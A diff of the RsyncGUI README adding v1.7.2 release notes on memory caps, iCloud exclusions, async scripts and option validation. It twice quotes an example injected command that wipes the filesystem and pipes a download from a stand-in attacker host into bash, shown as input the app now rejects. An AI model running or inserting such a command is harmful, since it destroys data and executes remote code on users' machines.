@@ -1,4 +1,4 @@
-# RsyncGUI v1.7.1
+# RsyncGUI v1.7.2
 
 ![Build](https://github.com/kochj23/RsyncGUI/actions/workflows/build.yml/badge.svg)
 
@@ -20,7 +20,7 @@ A modern, open-source alternative to the discontinued [RsyncOSX](https://github.
 
 ## Download
 
-Download the latest release: [RsyncGUI v1.7.0](https://github.com/kochj23/RsyncGUI/releases/latest)
+Download the latest release: [RsyncGUI v1.7.2](https://github.com/kochj23/RsyncGUI/releases/latest)
 
 Or build from source (see below).
 
@@ -37,7 +37,34 @@ If you're coming from RsyncOSX (discontinued), RsyncGUI offers:
 
 ---
 
-## 🆕 What's New in v1.7.0 (February 2026)
+## 🆕 What's New in v1.7.2 (March 2026)
+
+### Bug Fix Release — Large Jobs, iCloud, and Reliability
+
+**Large jobs dying halfway through — fixed:**
+- Output buffer now capped at 10 MB per execution. Previously, jobs syncing 50,000+ files with `--verbose --progress` would accumulate hundreds of MB of rsync output in memory, eventually getting killed by the OS. Excess output is now truncated with a notice; full output is available in Console.app.
+- `verbose` and `compress` now default to **off**. These defaults were wrong for local/LAN syncs — verbose generates a line per file transferred, and compression actually slows down local transfers by burning CPU. Users who need them can still enable them per-job.
+- Parallel mode file list capped at 50,000 entries. The file enumeration for parallel splitting was loading every file path into a Swift array before starting any work, causing RAM exhaustion on large directories.
+- Directory change detection (`runOnlyIfChanged`) now caps at 100,000 files and yields to the cooperative thread pool every 5,000 entries, preventing it from blocking the main executor on large source directories.
+
+**iCloud Drive integration — fixed:**
+- Added `--exclude=*.icloud` automatically for all iCloud Drive destinations. Files that iCloud has evicted from local storage become `.filename.icloud` stub placeholders that rsync cannot read. Without this exclusion, rsync would error on every offloaded file or silently transfer the stub instead of the real content.
+- Removed a `Thread.sleep(0.5)` that was blocking the cooperative thread pool while "waiting for iCloud to recognize a new folder." iCloud's daemon (`bird`) handles folder recognition asynchronously regardless.
+
+**Other reliability fixes:**
+- Pre/post sync scripts (`runScript`) converted from blocking `waitUntilExit()` to async continuation. A hanging script no longer freezes the entire executor — it suspends without consuming a thread.
+- `rsh` (custom remote shell) now validated as an absolute path to an existing executable before use. Previously any string was passed to rsync's `-e` flag.
+- `rsyncPath` (remote rsync binary) validated against a safe-character pattern before use.
+
+---
+
+## What's New in v1.7.1 (March 4, 2026)
+
+**Security: Inline shell commands blocked** — `runScript()` now requires an absolute path to an executable file. Inline bash commands (e.g. `rm -rf /; curl attacker.com | bash`) are rejected, preventing shell injection via user-configured pre/post sync scripts.
+
+---
+
+## What's New in v1.7.0 (February 2026)
 
 ### Security Hardening & Code Quality Audit
 **30 findings resolved across CRITICAL, HIGH, MEDIUM, LOW, and INFO severities:**
@@ -518,7 +545,14 @@ node_modules/  # Exclude entire directories
 
 ## Version History
 
-### v1.7.1 (March 4, 2026) — Current
+### v1.7.2 (March 6, 2026) — Current
+- Fixed large jobs dying: output capped at 10 MB, `verbose`/`compress` default to off, parallel file list limited to 50k entries
+- Fixed iCloud Drive: `--exclude=*.icloud` added for offloaded placeholders; removed blocking `Thread.sleep`
+- Fixed `runScript` blocking executor thread with `waitUntilExit()`
+- Fixed `rsh`/`rsyncPath` options passed without validation
+- Fixed directory checksum blocking on large source trees
+
+### v1.7.1 (March 4, 2026)
 - **Security: Inline shell commands blocked** — `runScript()` now requires an absolute path to an executable file. Inline bash commands (e.g. `rm -rf /; curl attacker.com | bash`) are rejected, preventing shell injection via user-configured pre/post sync scripts.
 - **Security: Rsync binary hardcoded** — no longer reads executable path from UserDefaults (prevented binary substitution attack). Resolves from fixed list: `/usr/bin/rsync`, `/opt/homebrew/bin/rsync`, `/usr/local/bin/rsync`.
 - **Security: SSH key path validation** — key path must be an absolute path to an existing file with no `..` traversal sequences.
@@ -635,7 +669,7 @@ If you find RsyncGUI useful, please:
 
 ---
 
-**Last Updated:** February 26, 2026
+**Last Updated:** March 6, 2026
 **Status:** ✅ Production Ready
 
 ---
